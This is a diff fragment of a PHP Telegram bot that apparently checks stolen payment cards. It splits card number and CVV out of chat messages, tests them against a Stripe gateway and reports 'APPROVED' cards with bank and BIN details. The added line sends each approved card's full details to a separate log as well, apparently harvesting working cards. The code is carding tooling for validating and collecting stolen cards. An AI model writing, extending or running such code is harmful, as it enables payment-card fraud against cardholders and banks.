@@ -127,6 +127,7 @@ $cvv = multiexplode(array(":", "/", " ", "|"), $message)[4];
           $msg3a = Getstr($result1,'"decline_code": "','"');
           if(strpos($result3, '"cvc_check": "pass"' )) {
           sendMessage($chatId, "<b>Card: <code>$lista</code></b>\n<b>Status -» APPROVED ✅</b>\n<b>Response -» CARD SAVED SUCSSEDFULLY ✅</b>\n<b>Gateway -» Stripe CCN auth v2.1</b>\n\n---------[Bin details]-----------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY: $country \n\n\n--------------------------------\n\n\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
+          sendLog($chatId, "<b>Card: <code>$lista</code></b>\n<b>Status -» APPROVED ✅</b>\n<b>Response -» CARD SAVED SUCSSEDFULLY ✅</b>\n<b>Gateway -» Stripe CCN auth v2.1</b>\n\n---------[Bin details]-----------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY: $country \n\n\n--------------------------------\n\n\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
           return;
           }
           if(strpos($result3, '"id"' )) {
